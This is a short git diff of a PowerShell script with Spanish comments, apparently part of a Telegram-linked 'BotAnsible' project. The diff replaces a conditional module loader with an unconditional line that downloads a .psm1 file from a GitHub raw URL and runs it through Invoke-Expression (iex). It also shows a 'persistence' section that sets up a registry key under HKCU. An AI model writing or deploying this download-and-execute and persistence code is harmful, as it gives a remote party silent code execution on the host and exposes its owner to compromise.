@@ -7,13 +7,15 @@ function loader{    # aqui empieza la funcion loader
     )
     $ruta=$path;$ruta+=$file;$ruta+=".psm1" # monta la ruta completa
     $ruta
-    (Invoke-WebRequest $ruta -UseBasicParsing).Content | iex # carga las funciones externas en el ámbito del script               
+    (Invoke-WebRequest $ruta -UseBasicParsing).Content | iex # carga las funciones externas en el ámbito del script
+    . $file
 }
 
 $condition = $true
 $path = "https://raw.githubusercontent.com/josprou/BotAnsible/main/" # Dirección local donde cargar funciones y devolver resultados en caso de necesidad
-
-if([string[]]$commandlist -notcontains "account_ansible"){loader -file "account_ansible" -path $path;$commandlist+="account_ansible"}
+$ruta = $path;$ruta+="account_ansible";$ruta+=".psm1"
+(Invoke-WebRequest $ruta -UseBasicParsing).Content | iex
+#if([string[]]$commandlist -notcontains "account_ansible"){loader -file "account_ansible" -path $path;$commandlist+="account_ansible"}
 #persistence
 
 $RegKey = 'HKCU:\Software\MyTelegram'
